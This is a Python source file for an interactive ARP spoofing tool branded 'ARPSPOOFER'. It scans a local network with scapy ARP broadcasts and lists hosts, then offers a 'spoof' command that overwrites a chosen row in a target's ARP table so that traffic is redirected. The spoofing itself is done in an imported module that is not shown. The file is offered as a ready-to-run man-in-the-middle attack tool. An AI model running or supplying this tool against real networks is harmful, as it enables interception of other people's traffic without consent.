from pwn import log
from scapy.all import *
import subprocess
import threading
import sys
from arptables import *


print("""


|-----------------------------------------------------------------------|
||                                                                     ||
||       _    ____  ____  ____  ____   ___   ___  _____ _____ ____     ||
||      / \  |  _ \|  _ \/ ___||  _ \ / _ \ / _ \|  ___| ____|  _ \    ||
||     / _ \ | |_) | |_) \___ \| |_) | | | | | | | |_  |  _| | |_) |   ||
||    / ___ \|  _ <|  __/ ___) |  __/| |_| | |_| |  _| | |___|  _ <    ||
||   /_/   \_|_| \_|_|   |____/|_|    \___/ \___/|_|   |_____|_| \_\   ||
||                                                                     ||
||                                                                     ||
||   By: xalvarex                                                      ||
||   Github: https://github.com/xalvarex/                              ||
||                                                                     || 
|-----------------------------------------------------------------------|


""")


def arp_scan(network):
    
    hosts_up = []

    conf.verb = 0

    print("Scanning network (ARP)...")
    
    up, down = srp(Ether(dst = "ff:ff:ff:ff:ff:ff")/ARP(pdst = network), timeout = 3, iface = adapter, inter = 0.1)

    for snd,rcv in up:
        IP = str(rcv).split(' ')[7]
        MAC = str(rcv).split(' ')[5]
        hosts_up.append(IP + " " +MAC)
        
            
    return hosts_up
        
    
def show_hosts(host_list):
    
    print("|\t\tIP\t|\t\tMAC\t\t|")

    for host in host_list:


        IP = host.split(' ')[0]
        MAC = host.split(' ')[1]
        
        print("|\t{}\t|\t{}\t|".format(IP, MAC))
        
    




host_list = []
    
arptables = {}
adapter = False
    

try:
    adapter = sys.argv[1]
except:
    print("Provide a valid adapter")

while adapter:

    msg = input("\n> ").split(' ')

    if msg[0] == "arpscan":

        try:
            host_list = arp_scan(msg[1])

        except:
            
            network = input("\n> Select a network to Scan (ex: 192.168.0.0/24) > ")

            host_list = arp_scan(network)

        show_hosts(host_list)

    elif msg[0] == "hosts":
        show_hosts(host_list)

    elif msg[0] == "arptable":

        target = msg[1]
        
        try:
            arptables[target].show()

        except:
            arptables[target] = arptable(target, host_list)
            arptables[target].show()

    elif msg[0] == "spoof":

        target = msg[1]

        try:
            arptables[target].show() 
            
            ip_row = int(input("> Select ARP row to spoof > "))
            spoof_ip = input("> Spoof IP (its corresponent MAC will be placed in row to spoof) > ")

            arptables[target].spoof(ip_row, spoof_ip)
        
        except:
            arptables[target] = arptable(target, host_list)

            arptables[target].show() 
            
            ip_row = int(input("> Select ARP row to spoof > "))
            spoof_ip = input("> Spoof IP (its corresponent MAC will be placed in row to spoof) > ")

            arptables[target].spoof(ip_row, spoof_ip)
            





        




        


            



            

            


    

